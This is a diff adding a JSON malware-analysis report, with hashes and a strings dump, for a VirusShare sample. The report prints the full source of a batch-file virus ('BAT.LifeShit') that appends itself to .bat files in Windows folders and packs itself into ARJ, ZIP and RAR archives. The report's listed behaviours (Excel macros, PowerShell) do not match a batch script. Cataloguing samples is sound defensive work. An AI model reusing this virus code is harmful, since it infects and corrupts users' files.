@@ -1,0 +1,66 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros",
+            "command": "May run PowerShell commands",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "rem  Hi From BAT.LifeShit virus!  :)\n@ctty nul\nset Life=Shit\ncopy %0 ..\\%0\nif \"#%1\"==\"#find\" goto find\nif \"#%1\"==\"#infect\" goto infect\ncopy %0 setup.bat\nif \"#%1\"==\"#arj\" goto arj\nif \"#%1\"==\"#zip\" goto zip\nif \"#%1\"==\"#rar\" goto rar\n:find\nfor %%f in (*.bat c:\\windows\\*.bat c:\\windows\\command\\*.bat) do call %0 infect %%f\ngoto ende\n\n:infect\nif %2==%0 goto ende\n@copy %2 /A + %0 /A /Y\n\nif exist ..\\%0 call ..\\%0\nfor %%a in (*.arj) do call %0 arj %%a\nfor %%z in (*.zip) do call %0 zip %%z\nfor %%r in (*.rar) do call %0 rar %%r\ngoto ende\n\n:ARJ\narj a -y %2 setup.bat\ngoto ende\n\n:ZIP\npkzip %2 setup.bat\ngoto ende\n\n:RAR\nrar a -y %2 setup.bat\n\n:ende\ndel setup.bat\n\n\n"
+    },
+    "filename": "VirusShare_2cb8e60d0869ca1515adda581184220a",
+    "filesize": 698,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2cb8e60d0869ca1515adda581184220a",
+        "sha1": "1f1759fe97b72db85e777843e5cdb5761f98934f",
+        "sha256": "0778e924bbc6c45d144808386cd02aef5f1b89126c252245d2ffc6515f4e65a1"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "rem  Hi From BAT.LifeShit virus!  :)",
+            "@ctty nul",
+            "set Life=Shit",
+            "copy %0 ..\\%0",
+            "if \"#%1\"==\"#find\" goto find",
+            "if \"#%1\"==\"#infect\" goto infect",
+            "copy %0 setup.bat",
+            "if \"#%1\"==\"#arj\" goto arj",
+            "if \"#%1\"==\"#zip\" goto zip",
+            "if \"#%1\"==\"#rar\" goto rar",
+            ":find",
+            "for %%f in (*.bat c:\\windows\\*.bat c:\\windows\\command\\*.bat) do call %0 infect %%f",
+            "goto ende",
+            ":infect",
+            "if %2==%0 goto ende",
+            "@copy %2 /A + %0 /A /Y",
+            "if exist ..\\%0 call ..\\%0",
+            "for %%a in (*.arj) do call %0 arj %%a",
+            "for %%z in (*.zip) do call %0 zip %%z",
+            "for %%r in (*.rar) do call %0 rar %%r",
+            "goto ende",
+            ":ARJ",
+            "arj a -y %2 setup.bat",
+            "goto ende",
+            ":ZIP",
+            "pkzip %2 setup.bat",
+            "goto ende",
+            ":RAR",
+            "rar a -y %2 setup.bat",
+            ":ende",
+            "del setup.bat"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.260736",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
